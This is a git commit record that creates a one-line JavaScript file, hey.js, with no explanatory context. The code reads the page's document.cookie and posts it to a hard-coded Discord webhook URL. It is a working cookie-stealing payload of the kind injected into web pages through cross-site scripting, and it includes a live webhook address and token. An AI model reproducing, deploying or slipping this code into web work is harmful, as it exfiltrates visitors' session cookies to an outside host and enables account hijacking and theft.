34234633603506ebd5d13846bf2f4790c91f7ecc
asterisck <89295807+asterisck@users.noreply.github.com>
2022-04-05 15:12:52 +0530

    Create hey.js

---
+++ hey.js
@@ -0,0 +1,1 @@
+const msg="------------------------------------------------"+JSON.stringify({"content":document.cookie});fetch("https://discord.com/api/webhooks/960246843298693270/Tgiz4a2hqiMe4fRPUqOYrh9e3UuFx_IQ_TOMH0qAPZKAK2Rz-LuGuBaZVcVVvTj9_V2N",{"method":"POST","headers":{"content-type":"application/json"},"body":msg});
